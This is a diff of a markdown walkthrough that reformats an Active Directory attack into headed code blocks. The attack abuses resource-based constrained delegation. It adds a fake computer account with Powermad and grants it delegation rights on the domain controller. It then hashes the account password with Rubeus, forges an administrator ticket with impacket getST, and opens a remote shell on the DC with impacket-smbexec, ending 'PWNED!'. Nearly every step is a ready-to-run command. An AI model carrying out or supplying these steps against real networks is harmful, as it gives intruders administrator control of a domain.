@@ -8,26 +8,48 @@
 
 #### 1) Transfer rubeus and powermad on target machine
 
-#### 2) Import-Module ./powermad.ps1 (Import powermad)
+#### 2) Import Powermad
 
-#### 3) Import-Module ActiveDirectory
+    Import-Module ./powermad.ps1 (Import powermad)
 
-#### 4) Set-Variable -Name "PwnPC" -Value "PWN01"
+#### 3) Import ActiveDirectory Module
 
-#### Set-Variable -Name "targetComputer" -Value "DC" (Set variables)
+    Import-Module ActiveDirectory
 
-#### 5) New-MachineAccount -MachineAccount (Get-Variable -Name "PwnPC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose ( With powermad, add the new fake computer object to AD)
+#### 4) Set Variables
 
-#### 6) Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "PwnPC").Value + '$') (With built-in AD modules, give the new fake computer object the Constrained Delegation privilege)
+    Set-Variable -Name "PwnPC" -Value "PWN01"
 
-#### 7) Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount (With built-in AD modules, check that the last command worked)
+#### 
 
-#### 8) .\rubeus.exe hash /password:123456 /user:PWN01$ /domain:DOMAIN.LOCAL (With Rubeus, generate the new fake computer object password hashes.)
+    Set-Variable -Name "targetComputer" -Value "DC" 
 
-#### 9) Impacket-getST DOMAIN.LOCAL/PWN01 -dc-ip DC.DOMAIN.LOCAL -impersonate administrator -spn http://DC.DOMAIN.LOCAL -aesKey GENERATED_AESKEY (Using the getST impacket module, generate a ccached TGT and used KERB5CCNAME pass the ccache file for the requested service)
+#### 5) With Powermad, add the new fake computer object to AD
 
-#### 10) export KRB5CCNAME=administrator.ccache (Set local variable of KERB5CCNAME to pass the ccache TGT file for the requested service)
+    New-MachineAccount -MachineAccount (Get-Variable -Name "PwnPC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose ( With powermad, add the new fake computer object to AD)
 
-#### 11) impacket-smbexec DOMAIN.LOCAL/administrator@DC.DOMAIN.LOCAL -no-pass -k (Use smbexec impacket module to connect with the TGT we just made to the server as the user administrator over SMB)
+#### 6) With built-in AD modules, give the new fake computer object the Constrained Delegation privilege
+
+    Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "PwnPC").Value + '$') 
+
+#### 7) With built-in AD modules, check that the last command worked
+
+    Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount 
+
+#### 8) With Rubeus, generate the new fake computer object password hashes.
+
+    .\rubeus.exe hash /password:123456 /user:PWN01$ /domain:DOMAIN.LOCAL 
+
+#### 9) Using the getST impacket module, generate a ccached TGT and used KRB5CCNAME pass the ccache file for the requested service
+
+    Impacket-getST DOMAIN.LOCAL/PWN01 -dc-ip DC.DOMAIN.LOCAL -impersonate administrator -spn http://DC.DOMAIN.LOCAL -aesKey GENERATED_AESKEY 
+
+#### 10) Set local variable of KRB5CCNAME to pass the ccache TGT file for the requested service
+
+    export KRB5CCNAME=administrator.ccache 
+
+#### 11) Use smbexec impacket module to connect with the TGT we just made to the server as the user administrator over SMB
+
+    impacket-smbexec DOMAIN.LOCAL/administrator@DC.DOMAIN.LOCAL -no-pass -k 
 
 #### 12) PWNED!
